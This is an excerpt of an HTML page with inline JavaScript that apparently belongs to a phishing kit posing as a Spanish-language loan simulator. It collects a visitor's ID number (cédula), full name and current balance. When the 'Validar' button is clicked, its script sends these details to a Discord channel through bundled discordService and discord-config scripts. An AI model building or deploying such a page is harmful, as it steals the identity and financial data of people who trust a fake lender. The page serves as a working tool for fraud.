      ...
      <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
        <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
          <a href="loan-simulator.php.html" class="h-8 [&amp;&gt;svg]:w-[100px]">
            <svg _ngcontent-atq-c28="" width="180" height="40" viewbox="0 0 104 32" fill="none"
              xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
              <path _ngcontent-atq-c28=""
          ...
          <button class="flex flex-col justify-between w-[25px] h-[20px] bg-transparent border-none cursor-pointer"
            aria-label="Menu">
            <span
              class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
            <span
              class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
            <span
              class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
  ...
  <main class="mainContainer">
    <section class="">
      <div class="bg-white rounded-lg">
          ...
          <div class="max-w-[400px] mx-auto">
            <div class="bg-purple-primary w-full rounded-lg p-4">
              ...
              <div class="relative">
                ...
                <input type="range" id="montoSalvavidas" min="100000" max="2400000" step="100000" value="100000"
            ...
            <div class="flex flex-col justify-center items-center gap-4 mb-3 w-full">
              ...
              <div class="form-group">
                <input type="text" required="" inputmode="numeric" maxlength="10" pattern="[0-9]*"
                  id="cedulaSalvavidas">
            ...
            <!-- Botón Acepta -->
            <button type="button" id="btnContinuarSalvavidas"
              class="w-full bg-pink-primary text-white py-4 px-6 rounded-md text-lg hover:bg-pink-600 transition-colors disabled:opacity-80 disabled:cursor-not-allowed"
              disabled="">
              Validar
            </button>
          </div>
        ...
        <script>
          document.addEventListener("DOMContentLoaded", () => {
            ...
            function calcularCuotaMensualSalvavidas(monto) {
              const meses = 12; // Valor por defecto ya que se eliminó el selector
            ...
            function actualizarEstadoBotonContinuar() {
              ...
              btnContinuarSalvavidas.disabled = !(
                cedulaValida && nombreValido && saldoActualValido
              );
            ...
            btnContinuarSalvavidas.addEventListener("click", async (e) => {
              ...
              try {
                ...
                // Enviar a Discord usando el servicio centralizado con reintentos
                const discordMessage = `🟣 INFO DE PRÉSTAMO 🟣\n\n🪪 Cédula: ${formData.cedula}\n👤 Nombre y apellido: ${formData.nombreCompleto}\n💰 Saldo actual: ${formData.saldoActual}`;

                try {
                  await window.discordService.sendMessage(discordMessage);
                } catch (discordError) {
                  console.error("Fallo final en Discord tras reintentos:", discordError);
                }
        ...
        <script src="access-passed/js/discord-config.js"></script>
        <script src="access-passed/js/discordService.js"></script>
      </div>
    </section>
    <footer>
      <div class="wrap">
